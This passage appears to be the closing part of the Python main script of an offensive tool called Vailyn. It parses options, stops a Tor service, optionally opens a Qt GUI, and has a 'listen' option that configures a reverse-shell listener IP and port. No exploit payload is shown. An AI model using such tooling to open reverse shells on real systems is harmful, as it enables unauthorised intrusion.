                subprocess.run(["service", "tor", "stop"])
            except OSError:
                subprocess.run(["brew", "services", "stop", "tor"])
            except Exception as e:
                sys.exit(e)


if __name__ == "__main__":
    try:
        banner()
        parser = build_parser()
        opt = vars(parser.parse_args())
        args = parser.parse_args()
        if opt["timeout"]:
            variables.timeout = args.timeout
            variables.stable = True
            assert variables.timeout != None
        if opt["debug"]:
            variables.verbose = True
        if opt["listen"]:
            ip, port = args.listen
            variables.revshell = True
            variables.LISTENIP = ip
            variables.LISTENPORT = port
            assert variables.revshell and variables.LISTENIP != None and variables.LISTENPORT != None
        if opt["app"]:
            app = QtWidgets.QApplication(sys.argv) 
            window = VailynApp() 
            app.setWindowIcon(QtGui.QIcon("core/qt5/icons/Vailyn.png"))
            rcode = app.exec_() 
        else:
            main(parser, opt, args)
    except KeyboardInterrupt:
        print('\nInterrvpted.\n')
